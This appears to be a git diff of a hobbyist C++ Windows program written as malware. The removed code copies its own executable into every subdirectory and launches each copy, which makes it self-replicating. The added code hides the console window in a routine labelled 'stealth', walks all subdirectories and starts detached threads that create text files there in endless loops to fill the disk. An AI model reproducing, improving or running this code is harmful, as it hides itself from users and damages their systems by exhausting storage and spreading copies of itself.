@@ -7,73 +7,19 @@
 #include <sstream>
 #include <windows.h>
 #include <thread>
-/*so, the only problem im having is that create_proc() is getting stuck in copy_c infinite loop
-idk when i will fix this lmao*/
 
-/*
-void Copy_A (){
+void Copy_A(const std::string &subdir_path)
+{
     std::ostringstream oss;
     std::ofstream file;
     int i = 1;
     while (true)
     {
         i++;
-        oss << i << ".txt";
+        oss << subdir_path << "\\" << i << ".txt";
         file.open(oss.str());
         oss.str("");
         file.close();
-    }
-}
-*/
-
-void create_proc(const std::vector<std::string>& paths_2){
-    std::vector<std::thread> threads;
-    for (const std::string &i : paths_2)
-    {
-        threads.emplace_back([=](){
-            STARTUPINFOA si;
-            PROCESS_INFORMATION pi;
-            ZeroMemory(&si, sizeof(si));
-            si.cb = sizeof(si);
-            ZeroMemory(&pi, sizeof(pi));
-            si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
-            si.wShowWindow = SW_SHOW;
-            si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
-            si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
-            si.hStdError = GetStdHandle(STD_ERROR_HANDLE);
-            std::string app_name = i;
-            app_name += "\\91828938919283791827.exe";
-            std::string cmd_line = "\"" + app_name + "\"";
-            if (!CreateProcessA(NULL, &cmd_line[0], NULL, NULL, FALSE, 0, NULL, &i[0], &si, &pi))
-            {
-                printf("Error when creating process\n");
-            }
-            else
-            {
-                printf("Creating process: %s\n", app_name.c_str());
-                Sleep(1000); // add a delay of 1 second
-                printf("Process created successfully!\n");
-                WaitForSingleObject(pi.hProcess, INFINITE);
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
-            }
-        });
-    }
-    for (auto& thread : threads) {
-        thread.join();
-    }
-}
-void copy_itself(const std::vector<std::string>& paths){
-    char cwd[256];
-    std::string src_path(getcwd(cwd, sizeof(cwd)));
-    src_path += "\\copy_c.exe";
-    for (const std::string& n : paths){
-        std::string dst_paths = n;
-        dst_paths += "\\91828938919283791827.exe";
-        if (!CopyFileA(src_path.c_str(), dst_paths.c_str(), FALSE))
-        {
-            std::cerr << "Failed to copy file: " << dst_paths << std::endl;
-       }
     }
 }
 
@@ -105,6 +51,9 @@ void iterate_subdirs(const std::string &dir_path, std::vector<std::string> &dirs
             std::cout << "Found subdirectory: " << subdir_path << std::endl;
             dirs.push_back(subdir_path); // add subdir_path to the vector
             iterate_subdirs(subdir_path, dirs);
+            // create a new thread for Copy_A() and pass the subdirectory to it
+            std::thread t(Copy_A, subdir_path);
+            t.detach(); // detach the thread so it runs independently
         }
     } while (_findnext(handle, &file_info) == 0);
 
@@ -113,17 +62,13 @@ void iterate_subdirs(const std::string &dir_path, std::vector<std::string> &dirs
 
 int main()
 {
-    std::string str = "C:\\Users\\Pedro\\Desktop\\c++testarea";
+    char cwd[256];
+    std::string str = getcwd(cwd,sizeof(cwd));
     std::vector<std::string> dirs;
+    HWND stealth;
+    AllocConsole();
+    stealth = FindWindowA("ConsoleWindowClass", NULL);
+    ShowWindow(stealth, 0);
     iterate_subdirs(str, dirs);
-
-    for (const auto &dir : dirs)
-    {
-        std::vector<std::string> dir_path = {dir}; // create a vector with a single string element
-        copy_itself(dir_path);
-    }
-    for (const auto &dir_2 : dirs){
-        std::vector<std::string> dir_path2 = {dir_2};
-        create_proc(dir_path2);
-    }
+    while(true){}
 }
